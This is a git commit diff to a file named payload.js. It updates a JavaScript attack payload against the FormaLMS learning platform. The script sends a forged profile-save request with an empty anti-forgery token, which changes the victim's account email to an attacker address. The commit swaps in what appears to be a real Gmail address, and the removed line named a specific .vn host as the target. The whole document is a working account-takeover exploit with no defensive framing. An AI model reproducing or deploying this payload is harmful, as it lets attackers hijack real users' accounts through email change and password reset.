2aeab6225ee65415a053c9ad1b65efdb681d669d
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2022-04-10 21:35:19 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,10 +1,10 @@
 var target = document.location.host;
-var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hacked@admin.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";
+var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hackervnn40@gmail.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";
 
 function pwnEmail(){
 
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://" + bvhagl.com.vn + "/formalms/appLms/index.php?"+params, true);
+    xhr.open("GET", "http://" + target + "/formalms/appLms/index.php?"+params, true);
     xhr.send(null);
 
 }
